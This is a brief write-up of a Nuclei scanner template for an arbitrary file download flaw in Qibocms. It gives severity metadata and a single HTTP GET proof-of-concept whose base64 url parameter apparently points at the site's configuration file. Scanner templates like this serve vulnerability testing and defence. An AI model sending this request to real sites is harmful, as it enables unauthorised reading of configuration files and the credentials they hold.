# Nuclei Template: Qibocms - Arbitrary File Download
**Template ID:** qibocms-file-download
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`qibocms-file-download.yaml`)

## Vulnerability Information & PoC

## Description
Qibocms is vulnerable to arbitrary file download vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
```

